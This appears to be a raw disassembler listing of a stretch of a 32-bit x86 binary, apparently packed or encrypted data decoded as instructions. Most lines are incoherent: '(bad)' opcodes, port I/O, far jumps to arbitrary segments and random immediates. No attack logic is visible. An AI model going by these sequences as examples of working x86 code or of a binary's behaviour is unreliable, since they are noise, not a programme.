  42da53:	inc    ebx
  42da54:	sub    DWORD PTR [edx+ecx*2+0x62],esi
  42da58:	mov    ds:0x6be1449a,al
  42da5d:	inc    esi
  42da5e:	xor    bh,BYTE PTR [eax-0xb04e8fb]
  42da64:	cld    
  42da65:	out    0x35,eax
  42da67:	or     al,0x22
  42da69:	add    eax,DWORD PTR [ecx+eiz*2+0x22]
  42da6d:	mov    WORD PTR [esi-0x7d],es
  42da70:	jp     0x42dab0
  42da72:	enter  0xe162,0x3c
  42da76:	imul   esi,ebp,0xebef6fb
  42da7c:	pop    ecx
  42da7d:	(bad)  
  42da7f:	imul   ebp,DWORD PTR [edi+eax*4],0x4d
  42da83:	jmp    0x34ee:0x9abae3f9
  42da8a:	test   al,0x74
  42da8c:	in     eax,dx
  42da8d:	push   0x6f97bc4f
  42da92:	bound  ebx,QWORD PTR [eax-0x6e]
  42da95:	(bad)  
  42da97:	call   0x47213ed8
  42da9c:	mov    cl,0x60
  42da9e:	js     0x42da5f
  42daa0:	xor    BYTE PTR [eax-0x5e15e912],0xd2
  42daa7:	and    ecx,DWORD PTR [ebx-0x72e6f75c]
  42daad:	jne    0x42da6d
  42daaf:	mov    eax,ds:0xc99e8c5
  42dab4:	sub    DWORD PTR [edi-0x2a],ebp
  42dab7:	arpl   WORD PTR [ebx+0x23],di
  42daba:	pop    es
  42dabb:	mov    eax,eax
  42dabd:	jae    0x42db12
  42dabf:	rcr    BYTE PTR [ebp*2-0x2788e983],1
  42dac6:	cmp    edx,ebp
  42dac8:	lods   eax,DWORD PTR ds:[esi]
  42dac9:	push   edi
  42daca:	sbb    al,0xaa
  42dacc:	mov    bl,0xfc
  42dace:	dec    edx
  42dacf:	inc    esi
  42dad0:	xor    al,0x9a
  42dad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dad3:	(bad)  
  42dad4:	and    ah,BYTE PTR [edi-0x21]
  42dad7:	jo     0x42db37
  42dad9:	push   ecx
  42dada:	xchg   esi,eax
  42dadb:	fcom   QWORD PTR [edi+0x49]
  42dade:	push   ds
  42dadf:	jno    0x42db13
  42dae1:	dec    esi
  42dae2:	stc    
  42dae3:	popw   ds
  42dae5:	jb     0x42daad
  42dae7:	sbb    DWORD PTR [ebp-0x56],edi
  42daea:	fild   WORD PTR [ebp+0xb]
  42daed:	(bad)
  42daf0:	arpl   WORD PTR [ebx+0x59a34b68],di
  42daf6:	dec    esp
  42daf7:	jmp    0xf732:0xb4003dc0
  42dafe:	sar    BYTE PTR [edi],0x45
  42db01:	push   ds
  42db02:	inc    eax
  42db03:	jo     0x42db5d
  42db05:	add    BYTE PTR [ecx],cl
  42db07:	addr16 pop esi
  42db09:	dec    ebx
  42db0a:	fs iret 
  42db0c:	es cld 
  42db0e:	mov    esp,0x87
	...
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db56
  42db81:	adc    al,0xf
  42db83:	clc    
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	call   0xdbcc:0xd68cb408
  42db93:	inc    ecx
  42db94:	clc    
  42db95:	loopne 0x42dbc9
  42db97:	dec    ebx
  42db98:	ret    0x5397
  42db9b:	in     al,dx
  42db9c:	xlat   BYTE PTR ds:[ebx]
  42db9d:	push   esp
  42db9e:	mov    bl,ah
  42dba0:	in     eax,0x6a
  42dba2:	ret    
  42dba3:	inc    edx
  42dba4:	push   edx
  42dba5:	pusha  
  42dba6:	dec    edi
  42dba7:	sub    ah,BYTE PTR [eax]
  42dba9:	ins    BYTE PTR es:[edi],dx
  42dbaa:	nop
  42dbab:	and    ebp,DWORD PTR [eax]
  42dbad:	iret   
  42dbae:	mov    bl,ch
  42dbb0:	repnz stos DWORD PTR es:[edi],eax
  42dbb2:	cwde   
  42dbb3:	dec    ecx
  42dbb4:	out    dx,al
  42dbb5:	or     DWORD PTR [esi+0x2e],ecx
  42dbb8:	das    
  42dbb9:	or     al,0x88
  42dbbb:	js     0x42db9c
  42dbbd:	push   edx
  42dbbe:	in     al,0x91
  42dbc0:	push   es
  42dbc1:	in     eax,dx
  42dbc2:	or     DWORD PTR [esp+ecx*2],esp
  42dbc5:	xchg   ecx,eax
  42dbc6:	jae    0x42dbed
  42dbc8:	xor    DWORD PTR [edi+esi*2],edi
  42dbcb:	aam    0x87
  42dbcd:	push   esp
  42dbce:	and    bh,BYTE PTR [edi]
  42dbd0:	sbb    eax,0x44435d0d
  42dbd5:	sbb    esp,DWORD PTR [ebp+esi*8-0x49]
  42dbd9:	mov    dl,0xde
  42dbdb:	hlt    
  42dbdc:	(bad)  [esi+0x2521514a]
  42dbe2:	std    
  42dbe3:	mov    ecx,0x6606f05a
  42dbe8:	lods   al,BYTE PTR ds:[esi]
  42dbe9:	enter  0xf3e3,0xae
  42dbed:	imul   ebx,DWORD PTR [edx+eiz*2],0x7a
  42dbf1:	out    dx,al
  42dbf2:	fs jb  0x42dbbc
  42dbf5:	dec    ebx
  42dbf6:	ja     0x42dba3
  42dbf8:	dec    edx
  42dbf9:	push   es
  42dbfa:	retf   
  42dbfb:	loop   0x42dc49
  42dbfd:	imul   eax,ecx,0x4572f3c3
  42dc03:	idiv   bh
  42dc05:	jne    0x42dbb8
  42dc07:	in     eax,dx
  42dc08:	in     eax,0xe
  42dc0a:	inc    edi
  42dc0b:	xchg   DWORD PTR [edi+0x37b14778],ebp
  42dc11:	inc    ecx
  42dc12:	aaa    
  42dc13:	sbb    eax,0xfbda6bea
  42dc18:	pop    ebp
  42dc19:	out    0xff,eax
  42dc1b:	adc    eax,0xa2477e16
  42dc20:	popf   
  42dc21:	lea    esi,[ebp+ebp*4+0x34]
  42dc25:	sbb    ebx,esp
  42dc27:	cmc    
  42dc28:	inc    ebp
  42dc29:	es jge 0x42dbe9
  42dc2c:	int    0x2
  42dc2e:	push   cs
  42dc2f:	fidivr DWORD PTR [edi]
  42dc31:	pushf  
  42dc32:	dec    ebp
  42dc33:	daa    
  42dc34:	dec    ebx
  42dc35:	mov    ch,0x60
  42dc37:	xchg   edi,eax
  42dc38:	mov    cl,0xd4
  42dc3a:	loope  0x42dcac
  42dc3c:	and    esp,ecx
  42dc3e:	adc    BYTE PTR [edi],cl
  42dc40:	or     al,ah
  42dc42:	lock imul edi,DWORD PTR [esi],0x2b
  42dc46:	jbe    0x42dc9f
  42dc48:	retf   
  42dc49:	iret   
  42dc4a:	into   
  42dc4b:	pop    edi
  42dc4c:	sub    ebp,DWORD PTR [esi]
  42dc4e:	adc    dl,BYTE PTR [edi]
  42dc50:	jp     0x42dbf2
  42dc52:	shr    BYTE PTR [ebx+0x46b2b2b8],0x6d
  42dc59:	push   eax
  42dc5a:	out    0x73,al
  42dc5c:	lock retf 0x6987
  42dc60:	in     eax,dx
  42dc61:	shl    BYTE PTR [eax+0x36b78cd9],1
  42dc67:	and    al,BYTE PTR [ebp-0x54d8dac6]
  42dc6d:	mov    ecx,DWORD PTR [edx+esi*2]
  42dc70:	stos   DWORD PTR es:[edi],eax
  42dc71:	std    
  42dc72:	or     DWORD PTR [ecx],ebp
  42dc74:	sbb    al,0x87
  42dc76:	es inc edi
  42dc78:	loop   0x42dc08
  42dc7a:	inc    edi
  42dc7b:	mov    edx,0x4a1a4d10
  42dc80:	dec    ebx
  42dc81:	jo     0x42dc43
  42dc83:	or     edi,DWORD PTR [esi-0x4dc387e5]
  42dc89:	ret    0x399d
  42dc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc8d:	rcl    BYTE PTR [eax],0x3f
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	cdq    
  42dd01:	(bad)  
  42dd02:	daa    
  42dd03:	mov    ebx,0x1ea2c
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	xlat   BYTE PTR ds:[ebx]
  42dd0d:	mov    al,0x80
  42dd0f:	into   
  42dd10:	cmp    dh,ch
  42dd12:	xchg   edx,eax
  42dd13:	outs   dx,DWORD PTR ds:[esi]
  42dd14:	pop    esi
  42dd15:	xchg   ebp,eax
  42dd16:	std    
  42dd17:	(bad)  
  42dd18:	div    DWORD PTR [edx+ebp*4]
  42dd1b:	jmp    0xa036:0x3e5aefbf
  42dd22:	pop    esp
  42dd23:	pop    es
  42dd24:	xchg   BYTE PTR [edx-0x645586d4],dl
  42dd2a:	into   
  42dd2b:	test   al,0x9c
  42dd2d:	cs loopne 0x42dd7b
  42dd30:	and    DWORD PTR [ebp-0x1be73a93],ebp
  42dd36:	mov    ah,0xd3
  42dd38:	or     BYTE PTR [ebp-0x15],0x7e
  42dd3c:	mov    edi,0x891d872f
  42dd41:	out    dx,al
  42dd42:	aaa    
  42dd43:	pop    ecx
  42dd44:	mov    esp,0xb5b9f706
  42dd49:	test   al,0x8d
  42dd4b:	mov    ebp,0xeff88f83
  42dd50:	dec    ecx
  42dd51:	and    DWORD PTR [eax-0x72],ebx
  42dd54:	out    dx,eax
  42dd55:	outs   dx,DWORD PTR ds:[esi]
  42dd56:	xchg   ecx,eax
  42dd57:	cmp    edi,esi
  42dd59:	inc    ebx
  42dd5a:	loopne 0x42dcfc
  42dd5c:	and    DWORD PTR [edi-0x34],esp
  42dd5f:	push   0xffffffd5
  42dd61:	xchg   edx,eax
  42dd62:	das    
  42dd63:	sub    cl,ah
  42dd65:	add    eax,0xe6aa8399
  42dd6a:	inc    ebx
  42dd6b:	aam    0x65
  42dd6d:	dec    eax
  42dd6e:	adc    eax,0x386c618f
  42dd73:	cmp    DWORD PTR [esi-0x16],0xffffffaf
  42dd77:	sbb    eax,0x299cfe8d
  42dd7c:	mov    esi,0xbf5a256
  42dd81:	lea    esi,[ebp-0x77]
  42dd84:	adc    BYTE PTR [ebx],0xf5
  42dd87:	in     eax,dx
  42dd88:	push   es
  42dd89:	out    0x52,eax
  42dd8b:	loopne 0x42dd7a
  42dd8d:	mov    edx,DWORD PTR [edi]
  42dd8f:	sbb    BYTE PTR [edx-0x58],ah
  42dd92:	pop    eax
  42dd93:	adc    eax,0x3b0ed8a7
  42dd98:	retf   0xff34
  42dd9b:	lods   al,BYTE PTR ds:[esi]
  42dd9c:	popa   
  42dd9d:	imul   dl
  42dd9f:	or     ecx,DWORD PTR [ebx-0x7abfbc2a]
  42dda5:	retf   
  42dda6:	ds jmp 0x42dd3e
  42dda9:	or     BYTE PTR [eax+0xdb18258],dl
  42ddaf:	cmp    ch,ah
  42ddb1:	bound  edx,QWORD PTR [eax+0x5af89d4d]
  42ddb7:	in     eax,dx
  42ddb8:	or     ax,0x9967
  42ddbc:	pop    edx
  42ddbd:	fstp   QWORD PTR [ebp+0x1ad7e95a]
  42ddc3:	retf   0x8f55
  42ddc6:	bound  edi,QWORD PTR ds:0xfba34f70
  42ddcc:	and    eax,esi
  42ddce:	pop    edi
  42ddcf:	pop    ebx
  42ddd0:	repnz sbb dl,BYTE PTR ds:[edx]
  42ddd4:	add    bh,bl
  42ddd6:	xor    eax,0xc00513b4
  42dddb:	daa    
  42dddc:	ja     0x42de18
  42ddde:	into   
  42dddf:	jae    0x42de48
  42dde1:	into   
  42dde2:	pop    edx
  42dde3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dde4:	mov    eax,0xc4fd07b8
  42dde9:	aad    0xa
  42ddeb:	ficom  DWORD PTR [esi]
  42dded:	popf   
  42ddee:	pusha  
  42ddef:	clc    
  42ddf0:	fs fmulp st(4),st
  42ddf3:	sbb    dh,bl
  42ddf5:	mov    dh,0xa7
  42ddf7:	addr16 xchg edx,eax
  42ddf9:	dec    edi
  42ddfa:	test   al,0xc5
  42ddfc:	leave  
  42ddfd:	addr16 loop 0x42de51
  42de00:	adc    ecx,DWORD PTR [ebp-0x4960c76d]
  42de06:	cmp    al,0x18
  42de08:	cdq    
  42de09:	cmp    DWORD PTR [ebx],ecx
  42de0b:	mov    ebp,0xbc3fb397
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	sahf   
  42de81:	fcom   DWORD PTR fs:[ecx+0x1eb30]
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	adc    eax,0x63525958
  42de91:	mov    ch,0x30
  42de93:	popa   
  42de94:	idiv   BYTE PTR [ebx+0x79971789]
  42de9a:	xchg   esp,eax
  42de9b:	enter  0xf7c,0x4c
  42de9f:	(bad)  
  42dea0:	les    ebp,FWORD PTR [ebp+0xb56cba6]
  42dea6:	sub    edx,edi
  42dea8:	mov    eax,ds:0x22fbe702
  42dead:	sub    al,0xf4
  42deaf:	outs   dx,BYTE PTR ds:[esi]
  42deb0:	xor    al,BYTE PTR [ebx-0x50]
  42deb3:	hlt    
  42deb4:	int    0xde
  42deb6:	add    ah,BYTE PTR [edx-0x43]
  42deb9:	mov    al,0xa4
  42debb:	mov    eax,ds:0x86716f
  42dec0:	addr16 cld 
  42dec2:	daa    
  42dec3:	mov    ch,0xb3
  42dec5:	push   edi
  42dec6:	jmp    0x42df22
  42dec8:	test   al,0x67
  42deca:	imul   ecx,DWORD PTR [esi],0xffffffe0
  42decd:	shr    DWORD PTR [esi],cl
  42decf:	dec    BYTE PTR [ebp+0x4c5f3555]
  42ded5:	jb     0x42dec9
  42ded7:	cmp    BYTE PTR [edx+0x34],ch
  42deda:	cwde   
  42dedb:	pop    esi
  42dedc:	or     esi,esi
  42dede:	adc    DWORD PTR [ebx-0x55b699d2],edi
  42dee4:	cld    
  42dee5:	ins    BYTE PTR es:[edi],dx
  42dee6:	int3   
  42dee7:	test   DWORD PTR [edx],ebx
  42dee9:	cmp    BYTE PTR [esi+0x336e1104],ch
  42deef:	dec    ebp
  42def0:	loopne 0x42df2b
  42def2:	out    0x96,al
  42def4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42def5:	push   cs
  42def6:	xor    eax,0xd775c90d
  42defb:	(bad)  
  42defc:	mov    al,0xb8
  42defe:	jmp    0x7e9c50c0
  42df03:	add    eax,0xdb910c8d
  42df08:	cmp    eax,0x6c167719
  42df0d:	or     DWORD PTR [ecx+ebp*4+0x33],esi
  42df11:	sbb    ecx,edx
  42df13:	push   ebp
  42df14:	mov    ebp,DWORD PTR [edi+0x8]
  42df17:	sbb    BYTE PTR [eax-0x68],bl
  42df1a:	dec    esp
  42df1b:	mov    eax,ds:0x9213c28
  42df20:	add    eax,0xa180d908
  42df25:	lds    ecx,FWORD PTR [eax]
  42df27:	mov    eax,0x91ae7232
  42df2c:	mov    edx,0x6b348e66
  42df31:	mov    al,ds:0x85b66799
  42df36:	inc    esi
  42df37:	test   DWORD PTR [edi-0x6b],0x52736c69
  42df3e:	lahf   
  42df3f:	mov    ah,0x2f
  42df41:	cmc    
  42df42:	mov    ah,0xa4
  42df44:	imul   eax,DWORD PTR [esi+edi*1+0x18],0x6985fe8d
  42df4c:	add    BYTE PTR gs:[edi+0x2b],0x85
  42df51:	sti    
  42df52:	pop    ss
  42df53:	dec    ebx
  42df54:	or     eax,0x8b865b36
  42df59:	leave  
  42df5a:	jmp    0x3b32fcdd
  42df5f:	add    al,0xfb
  42df61:	push   ds
  42df62:	retf   0x49
  42df65:	push   ss
  42df66:	sahf   
  42df67:	xor    BYTE PTR [ebx-0x1b3b307e],ah
  42df6d:	mov    dh,0xc7
  42df6f:	test   ebx,eax
  42df71:	hlt    
  42df72:	and    DWORD PTR [edi+0x1],esi
  42df75:	scas   al,BYTE PTR es:[edi]
  42df76:	(bad)  
  42df77:	add    al,0x82
  42df79:	add    ecx,DWORD PTR [ebp-0x49c61996]
  42df7f:	sub    cl,ah
  42df81:	addr16 add bl,cl
  42df84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df85:	mov    ds:0x48e89eda,al
  42df8a:	push   0x3c07f3d0
  42df8f:	push   ss
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x79]
  42e001:	ret    
  42e002:	sti    
  42e003:	data16 xor al,0xec
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	jmp    0xf0ee23ad
  42e011:	xchg   ebp,eax
  42e012:	add    eax,0x605f400c
  42e017:	dec    edx
  42e018:	fadd   QWORD PTR [ebx-0x6f296ee1]
  42e01e:	js     0x42e036
  42e020:	inc    esp
  42e021:	loop   0x42dff5
  42e023:	adc    BYTE PTR [edi],dl
  42e025:	ror    ah,cl
  42e027:	(bad)  
  42e02a:	lods   al,BYTE PTR ds:[esi]
  42e02b:	push   ecx
  42e02c:	xlat   BYTE PTR ds:[ebx]
  42e02d:	jge    0x42e04d
  42e02f:	pusha  
  42e030:	xor    al,0x2b
  42e032:	fbstp  TBYTE PTR [ecx]
  42e034:	sub    BYTE PTR [esi+0xa],ah
  42e037:	fadd   DWORD PTR [edi-0x53c43483]
  42e03d:	and    WORD PTR [esp+eax*1],si
  42e041:	sub    al,0xeb
  42e043:	dec    esi
  42e044:	jl     0x42e05c
  42e046:	adc    eax,0xc6e8f3f8
  42e04b:	or     eax,0x5d8ccff9
  42e050:	pop    esi
  42e051:	mov    al,ds:0x7de588fe
  42e056:	sub    al,BYTE PTR [edi+0x72]
  42e059:	outs   dx,DWORD PTR ds:[esi]
  42e05a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e05b:	jmp    0xad5a:0x99f35de9
  42e062:	ds aam 0x2c
  42e065:	sub    BYTE PTR [ecx-0x7be42e88],dl
  42e06b:	cmp    al,0x5a
  42e06d:	sbb    eax,0x59d97107
  42e072:	lahf   
  42e073:	or     eax,0x693de6e8
  42e078:	int    0xc7
  42e07a:	xchg   edi,eax
  42e07b:	jge    0x42e05f
  42e07d:	(bad)  
  42e07e:	popa   
  42e07f:	fs (bad) 
  42e081:	popf   
  42e082:	add    ebx,ecx
  42e084:	push   esp
  42e085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e086:	inc    eax
  42e087:	nop
  42e088:	jae    0x42e021
  42e08a:	xor    ch,bh
  42e08c:	stc    
  42e08d:	add    eax,0xe5dd9de
  42e092:	mov    al,ds:0xbcaa73c8
  42e097:	leave  
  42e098:	xchg   ecx,eax
  42e099:	push   cs
  42e09a:	cmp    DWORD PTR [edi+0x9e6beb2],ebp
  42e0a0:	xchg   edx,eax
  42e0a1:	icebp  
  42e0a2:	or     esi,DWORD PTR [ebx]
  42e0a4:	fbld   TBYTE PTR [ebp-0x30c3a02e]
  42e0aa:	aad    0x9c
  42e0ac:	es popf 
  42e0ae:	shr    DWORD PTR [ecx-0xb],0xbb
  42e0b2:	mov    ecx,0xee4635e7
  42e0b7:	jl     0x42e066
  42e0b9:	scas   eax,DWORD PTR es:[edi]
  42e0ba:	pop    edx
  42e0bb:	(bad)  
  42e0bd:	cmp    BYTE PTR [ebp-0x78],bl
  42e0c0:	xchg   edx,eax
  42e0c1:	mov    es:0xbd034b39,eax
  42e0c7:	stos   DWORD PTR es:[edi],eax
  42e0c8:	jmp    0xc303:0x3d007d46
  42e0cf:	push   0xe692f627
  42e0d4:	adc    eax,0x67c560e6
  42e0d9:	xchg   edi,eax
  42e0da:	xor    al,0xc5
  42e0dc:	shr    DWORD PTR ds:0x8dc5f7,0x52
  42e0e3:	(bad)  
  42e0e4:	jo     0x42e092
  42e0e6:	mov    edi,DWORD PTR [ebp-0x54]
  42e0e9:	jle    0x42e0cd
  42e0eb:	div    DWORD PTR [ebp+0x5175504e]
  42e0f1:	(bad)  
  42e0f2:	mul    DWORD PTR [ebp+0x16]
  42e0f5:	dec    edx
  42e0f6:	adc    eax,0x9628c730
  42e0fb:	rcl    DWORD PTR [edx+0x6c],0x8a
  42e0ff:	or     al,0xcb
  42e101:	fdiv   DWORD PTR [eax+ecx*4+0x63]
  42e105:	shl    BYTE PTR [ebx-0x11],0x77
  42e109:	jbe    0x42e099
  42e10b:	test   cl,cl
  42e10d:	inc    ecx
  42e10e:	pop    es
  42e10f:	sbb    DWORD PTR [eax],eax
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	sahf   
  42e181:	inc    edi
  42e182:	ret    0x38fc
  42e185:	in     eax,dx
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	in     al,0xe4
  42e18e:	std    
  42e18f:	mov    WORD PTR [edi],cs
  42e191:	adc    eax,0xe6175e12
  42e196:	mov    edi,0xc03ae60e
  42e19b:	mov    edx,0xeb2d4125
  42e1a0:	pop    edi
  42e1a1:	sti    
  42e1a2:	sub    BYTE PTR [edx+0x4b7e3d5b],0xf3
  42e1a9:	mov    bl,0x9
  42e1ab:	out    dx,al
  42e1ac:	inc    esi
  42e1ad:	xchg   ebx,eax
  42e1ae:	ret    0x86dc
  42e1b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1b2:	or     ecx,DWORD PTR [edi]
  42e1b4:	popf   
  42e1b5:	xchg   ecx,eax
  42e1b6:	fisttp QWORD PTR [ebp+0x48]
  42e1b9:	fld    TBYTE PTR [edi+0x51]
  42e1bc:	jne    0x42e1b7
  42e1be:	xchg   edx,eax
  42e1bf:	mov    ds:0xa1694725,al
  42e1c4:	scas   eax,DWORD PTR es:[edi]
  42e1c5:	popa   
  42e1c6:	fild   QWORD PTR [ebx+0x6d4e2257]
  42e1cc:	adc    ecx,DWORD PTR [ebx]
  42e1ce:	retf   
  42e1cf:	cmc    
  42e1d0:	fcomp  DWORD PTR [esi+0x20]
  42e1d3:	cmp    edi,DWORD PTR [esp+ebx*1]
  42e1d6:	push   0xec66bb77
  42e1db:	lods   eax,DWORD PTR ds:[esi]
  42e1dc:	cmc    
  42e1dd:	loopne 0x42e1ac
  42e1df:	sbb    eax,0xe861a807
  42e1e4:	into   
  42e1e5:	sbb    eax,0xa20c378a
  42e1ea:	xchg   ebp,eax
  42e1eb:	out    dx,al
  42e1ec:	cli    
  42e1ed:	push   ebx
  42e1ee:	mov    ds:0x50408a99,al
  42e1f3:	stos   DWORD PTR es:[edi],eax
  42e1f4:	or     ebx,DWORD PTR [edx+0x299cae87]
  42e1fa:	mov    ah,0x9a
  42e1fc:	call   0xf819:0x2910c95c
  42e203:	enter  0x7d0e,0x10
  42e207:	dec    edi
  42e208:	or     ah,BYTE PTR [esi+ebp*2+0x1a]
  42e20c:	nop
  42e20d:	adc    DWORD PTR [edi-0x10],eax
  42e210:	lahf   
  42e211:	push   ebp
  42e212:	idiv   DWORD PTR [ebx+0xb]
  42e215:	frstor [esi+0x53670ef5]
  42e21b:	mov    ebp,0xa53718bc
  42e220:	leave  
  42e221:	push   eax
  42e222:	in     eax,dx
  42e223:	popf   
  42e224:	xor    BYTE PTR [esi-0x27],0x6b
  42e228:	inc    bx
  42e22a:	rcr    BYTE PTR [esi+0xc],0xb6
  42e22e:	xchg   DWORD PTR [ecx+0x48c6588a],esp
  42e234:	mov    ebp,ecx
  42e236:	daa    
  42e237:	pop    es
  42e238:	ins    DWORD PTR es:[edi],dx
  42e239:	loope  0x42e1da
  42e23b:	test   BYTE PTR [edx],ch
  42e23d:	ins    BYTE PTR es:[edi],dx
  42e23e:	(bad)  
  42e23f:	retf   
  42e240:	clc    
  42e241:	sub    al,0x1e
  42e243:	lahf   
  42e244:	jnp    0x42e21b
  42e246:	fld    TBYTE PTR [eax-0x3c]
  42e249:	jne    0x42e21e
  42e24b:	inc    ebp
  42e24c:	addr16 mov ebp,0x83a467e3
  42e252:	stos   BYTE PTR es:[edi],al
  42e253:	add    BYTE PTR [ebp+0x4f030153],cl
  42e259:	add    edx,DWORD PTR [edx]
  42e25b:	jmp    0x42e26d
  42e25d:	mov    al,0x4f
  42e25f:	popa   
  42e260:	fimul  WORD PTR [edx-0x3814d9fc]
  42e266:	jg     0x42e1eb
  42e268:	adc    al,0xd7
  42e26a:	cmp    al,0x35
  42e26c:	aad    0xad
  42e26e:	xlat   BYTE PTR ds:[ebx]
  42e26f:	xchg   ebx,eax
  42e270:	push   ds
  42e271:	jl     0x42e23f
  42e273:	pop    edi
  42e274:	or     eax,0x180f9b0b
  42e279:	retf   0x54d8
  42e27c:	adc    DWORD PTR [ecx+0x75],eax
  42e27f:	inc    esi
  42e280:	mov    al,ds:0x4f90f0ac
  42e285:	or     DWORD PTR [ebp+0x53],0x32fd984f
  42e28c:	inc    bh
  42e28e:	add    al,dl
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xcb199140
  42e301:	cmp    DWORD PTR [eax],esp
  42e303:	and    BYTE PTR [esi+ebp*8],bh
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	lods   al,BYTE PTR ds:[esi]
  42e30d:	imul   eax,DWORD PTR [ecx],0xffffff9a
  42e310:	xor    al,0x5
  42e312:	clc    
  42e313:	out    dx,eax
  42e314:	call   0x103b3d0e
  42e319:	push   ecx
  42e31a:	dec    ebx
  42e31b:	outs   dx,DWORD PTR ds:[esi]
  42e31c:	mov    cl,0xae
  42e31e:	(bad)  
  42e31f:	repz inc ecx
  42e321:	mov    ebx,0xa427c18c
  42e326:	shl    DWORD PTR [edx+0x5d],1
  42e329:	xchg   DWORD PTR [ebx-0x60],ecx
  42e32c:	pop    edx
  42e32d:	xor    ebx,DWORD PTR [eax+0x2c782f4c]
  42e333:	daa    
  42e334:	(bad)  
  42e335:	add    dl,BYTE PTR [edx-0x36]
  42e338:	bound  esi,QWORD PTR [esi+0x41]
  42e33b:	push   0x1d6af12
  42e340:	inc    edi
  42e341:	sahf   
  42e342:	aaa    
  42e343:	mov    ch,cl
  42e345:	add    cl,BYTE PTR [ecx-0x1bbb2cdc]
  42e34b:	mov    eax,ds:0x4c85725e
  42e350:	sbb    ecx,DWORD PTR [esi+eiz*8+0x4f]
  42e354:	jg     0x42e34b
  42e356:	jecxz  0x42e37a
  42e358:	std    
  42e359:	mov    ebp,0x4841bfcd
  42e35e:	mov    eax,ds:0x6388248e
  42e363:	loope  0x42e399
  42e365:	inc    ecx
  42e366:	mov    ebp,0x2d751a88
  42e36b:	addr16 (bad) 
  42e36d:	loope  0x42e358
  42e36f:	xchg   DWORD PTR [ecx+edi*1-0x5a],eax
  42e373:	hlt    
  42e374:	sub    BYTE PTR [eax+0x2b],ah
  42e377:	sub    al,0xf7
  42e379:	xor    BYTE PTR [edi+ebx*2-0x7df25394],0xa6
  42e381:	sbb    ah,bh
  42e383:	loope  0x42e3b0
  42e385:	sbb    esp,DWORD PTR [edx+0x78]
  42e388:	pop    ebx
  42e389:	sbb    BYTE PTR [edi+0x43],ch
  42e38c:	(bad)  
  42e38e:	ret    0xcbf5
  42e391:	push   esp
  42e392:	aas    
  42e393:	jmp    0x9299140d
  42e398:	mov    ebp,DWORD PTR [ecx+0x39]
  42e39b:	mov    bh,0x9
  42e39d:	mov    al,ds:0x3723514
  42e3a2:	and    DWORD PTR [esi-0x69198797],edx
  42e3a8:	pop    es
  42e3a9:	mov    ah,0xcf
  42e3ab:	and    al,0x7d
  42e3ad:	inc    ebx
  42e3ae:	add    al,0x3c
  42e3b0:	aad    0x91
  42e3b2:	ret    0x4f02
  42e3b5:	sub    BYTE PTR [ebx+0x14],bl
  42e3b8:	mov    ecx,0xed9ba311
  42e3bd:	shr    cl,0xc0
  42e3c0:	ret    
  42e3c1:	into   
  42e3c2:	jb     0x42e359
  42e3c4:	jmp    0x42e3b1
  42e3c6:	repnz adc al,BYTE PTR [ebx]
  42e3c9:	adc    BYTE PTR [eax],cl
  42e3cb:	cmp    al,0x99
  42e3cd:	xor    edi,ebp
  42e3cf:	and    dh,dh
  42e3d1:	mov    eax,ds:0x660c079e
  42e3d6:	xchg   BYTE PTR [esi+edi*2-0x7c],bh
  42e3da:	arpl   WORD PTR [edi],bx
  42e3dc:	cvttps2pi mm4,xmm2
  42e3df:	push   edx
  42e3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3e1:	fbld   TBYTE PTR gs:[ebp+0x28e94f05]
  42e3e8:	retf   0x1f54
  42e3eb:	cdq    
  42e3ec:	cld    
  42e3ed:	call   0x29d7:0x63750e0
  42e3f4:	xor    eax,DWORD PTR ss:[ebx+ebx*1]
  42e3f8:	loop   0x42e416
  42e3fa:	aam    0x69
  42e3fc:	mov    ds:0xaee8ba3d,al
  42e401:	or     BYTE PTR [ecx-0x45],0x23
  42e405:	or     dl,dh
  42e407:	mov    bl,0x12
  42e409:	ud1    esi,DWORD PTR [ecx+0x13]
  42e40d:	loope  0x42e3d1
  42e40f:	jl     0x42e411
	...
